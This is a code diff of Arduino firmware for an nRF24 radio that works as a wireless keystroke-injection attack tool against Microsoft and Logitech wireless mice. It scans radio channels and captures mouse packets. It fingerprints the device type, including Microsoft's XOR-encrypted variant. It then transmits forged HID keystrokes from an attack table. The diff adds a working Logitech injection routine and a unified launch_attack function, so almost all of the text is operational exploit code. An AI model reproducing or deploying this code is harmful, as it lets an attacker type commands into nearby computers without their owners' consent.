@@ -8,9 +8,8 @@
 #define CSN 6
 #define PKT_SIZE 37
 #define PAY_SIZE 32
-#define MS_NOCRYPT 1
-#define MS_XORCRYPT 2
-#define LOGITECH  3
+#define MICROSOFT 1
+#define LOGITECH 2
 
 RF24 radio(CE, CSN);
 
@@ -21,6 +20,8 @@ uint8_t channel = 25;
 uint64_t address;
 uint8_t payload[PAY_SIZE];
 uint8_t payload_size;
+bool payload_encrypted = false;
+uint8_t payload_type = 0;
 uint16_t sequence;
 
 void print_payload_details()
@@ -82,10 +83,8 @@ uint8_t writeRegister(uint8_t reg, const uint8_t* buf, uint8_t len)
 
 bool transmit()
 {
-  //radio.stopListening();
   print_payload_details();
   radio.write(payload, payload_size);
-  //radio.startListening();
   return true;
 }
 
@@ -117,6 +116,7 @@ void scan() {
   while (1) {
     channel++;
     if (channel > 80) {
+      Serial.println("starting channel sweep");
       digitalWrite(ledpin, HIGH);
       channel = 2;
     }
@@ -179,25 +179,31 @@ void scan() {
             crc = (crc << 8) | (crc >> 8);
 
             // Verify the CRC
-            if (crc == crc_given && payload_length > 0)
-            {
-              // Write the address
-              address = 0;
-              for (int i = 0; i < 4; i++)
-              {
-                address += buf[i];
-                address <<= 8;
+            if (crc == crc_given) {
+              Serial.print("found packet /w valid crc... ");
+
+              if (payload_length > 0) {
+                Serial.print("payload length is ");
+                Serial.println(payload_length);
+                // Write the address
+                address = 0;
+                for (int i = 0; i < 4; i++)
+                {
+                  address += buf[i];
+                  address <<= 8;
+                }
+                address += buf[4];
+
+                // Write the ESB payload to the output buffer
+                for(x = 0; x < payload_length + 3; x++)
+                  payload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
+                payload_size = payload_length;
+
+                print_payload_details();
+                return;
+              } else {
+                Serial.println("payload is empty. scanning...");
               }
-              address += buf[4];
-
-              // Write the ESB payload to the output buffer
-              for(x = 0; x < payload_length + 3; x++)
-                payload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
-              payload_size = payload_length;
-
-              //radio.flush_rx();
-              print_payload_details();
-              return;
             }
           }
         }
@@ -237,22 +243,35 @@ void ms_checksum()
   payload[last] = ~payload[last];
 }
 
-uint8_t fingerprint()
+void fingerprint()
 {
-  if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40)
-  {
-    return MS_NOCRYPT;
+  if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40) {
+    Serial.println("found MS mouse");
+    payload_type = MICROSOFT;
+    return;
   }
-  else if (payload_size == 19 && payload[0] == 0x0a)
-  {
-    return MS_XORCRYPT;
+
+  if (payload_size == 19 && payload[0] == 0x0a) {
+    Serial.println("found MS encrypted mouse");
+    payload_type = MICROSOFT;
+    payload_encrypted = true;
+    return;
   }
-  return 0;
+
+  if (payload[0] == 0) {
+    if (payload_size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F))
+      payload_type = LOGITECH;
+    if (payload_size == 22 && payload[1] == 0xD3)
+      payload_type = LOGITECH;
+    if (payload_size == 5 && payload[1] == 0x40)
+      payload_type = LOGITECH;
+    if (payload_type == LOGITECH) Serial.println("found Logitech mouse");
+  }
+  return;
 }
 
-void ms_transmit(uint8_t meta, uint8_t hid, bool use_crypt)
-{
-  if (use_crypt) ms_crypt();
+void ms_transmit(uint8_t meta, uint8_t hid) {
+  if (payload_encrypted) ms_crypt();
   for (int n = 4; n < payload_size; n++)
     payload[n] = 0;
   payload[4] = sequence & 0xff;
@@ -261,19 +280,19 @@ void ms_transmit(uint8_t meta, uint8_t hid, bool use_crypt)
   payload[7] = meta;
   payload[9] = hid;
   ms_checksum();
-  if (use_crypt) ms_crypt();
+  if (payload_encrypted) ms_crypt();
   // send keystroke (key down)
   transmit();
   sequence++;
 
-  if (use_crypt) ms_crypt();
+  if (payload_encrypted) ms_crypt();
   for (int n = 4; n < payload_size; n++)
     payload[n] = 0;
   payload[4] = sequence & 0xff;
   payload[5] = sequence >> 8 & 0xff;
   payload[6] = 67;
   ms_checksum();
-  if (use_crypt) ms_crypt();
+  if (payload_encrypted) ms_crypt();
   // send null keystroke (key up)
   transmit();
   sequence++;
@@ -283,48 +302,102 @@ void ms_transmit(uint8_t meta, uint8_t hid, bool use_crypt)
   return;
 }
 
-void attack_microsoft(bool use_crypt)
-{
-  Serial.print("attack_microsoft: ");
-  if (use_crypt) Serial.println("use_crypt = true");
-  else Serial.println("use_crypt = false");
+void log_checksum() {
+  uint8_t cksum = 0xff;
+  int last = payload_size - 1;
+  for (int n = 0; n < last; n++)
+    cksum -= payload[n];
+  cksum++;
+  payload[last] = cksum;
+}
 
-  uint8_t meta = 0;
-  uint8_t hid = 0;
-  uint8_t wait = 0;
-  int offset = 0;
+void log_transmit(uint8_t meta, uint8_t hid) {
+  // setup empty payload
+  payload_size = 10;
+  for (int n; n < payload_size; n++)
+    payload[n] = 0;
 
-  int keycount = sizeof(attack) / 3;
-  sequence = 0;
+  // prepare key down frame
+  payload[1] = 0xC1;
+  payload[2] = meta;
+  payload[3] = hid;
+  log_checksum();
 
-  // this is to sync the new serial
-  for (int i = 0; i < 6; i++)
-  {
-    ms_transmit(0, 0, use_crypt);
-  }
+  // send key down
+  transmit();
 
-  // now inject the hid codes
-  for (int i = 0; i < keycount; i++)
-  {
-    offset = i * 3;
-    meta = attack[offset];
-    hid = attack[offset + 1];
-    wait = attack[offset + 2];
+  // prepare key up (null) frame
+  payload[2] = 0;
+  payload[3] = 0;
+  log_checksum();
 
-    if (hid) {
-      ms_transmit(meta, hid, use_crypt);
+  // send key up
+  transmit();
+
+  // inter-keystroke delay
+  delay(10);
+  return;
+}
+
+void launch_attack() {
+  Serial.println("starting attack");
+
+  if (payload_type) {
+    Serial.println("payload type is injectable");
+    
+    digitalWrite(ledpin, HIGH);
+    start_transmit();
+
+    uint8_t meta = 0;
+    uint8_t hid = 0;
+    uint8_t wait = 0;
+    int offset = 0;
+
+    int keycount = sizeof(attack) / 3;
+    sequence = 0;
+
+    // this is to sync the new serial
+    if (payload_type == MICROSOFT) {
+      for (int i = 0; i < 6; i++) {
+        ms_transmit(0, 0);
+      }
     }
-    if (wait) {
-      delay(wait << 4);
+
+    // now inject the hid codes
+    for (int i = 0; i < keycount; i++)
+    {
+      offset = i * 3;
+      meta = attack[offset];
+      hid = attack[offset + 1];
+      wait = attack[offset + 2];
+
+      if (hid) {
+        Serial.print("sending hid code: ");
+        Serial.println(hid);
+        if (payload_type == MICROSOFT)
+          ms_transmit(meta, hid);
+        if (payload_type == LOGITECH)
+          log_transmit(meta, hid);
+      }
+      if (wait) {
+        Serial.println("waiting");
+        delay(wait << 4);
+      }
     }
+
+    digitalWrite(ledpin, LOW);
   }
   return;
 }
 
-void attack_logitech()
-{
-  Serial.println("attack_logitech: Not implemented :(");
-  return;
+void reset() {
+  payload_type = 0;
+  payload_encrypted = false;
+  payload_size = 0;
+  for (int i = 0; i < PAY_SIZE; i++) {
+    payload[i] = 0;
+  }
+  radio.begin();
 }
 
 void setup() {
@@ -334,23 +407,8 @@ void setup() {
 }
 
 void loop() {
-  radio.begin();
+  reset();
   scan();
-  uint8_t hw = fingerprint();
-  if (hw) {
-    digitalWrite(ledpin, HIGH);
-    start_transmit();
-    switch(hw) {
-      case MS_NOCRYPT:
-        attack_microsoft(false);
-        break;
-      case MS_XORCRYPT:
-        attack_microsoft(true);
-        break;
-      case LOGITECH:
-        attack_logitech();
-        break;
-    }
-    digitalWrite(ledpin, LOW);
-  }
+  fingerprint();
+  launch_attack();
 }
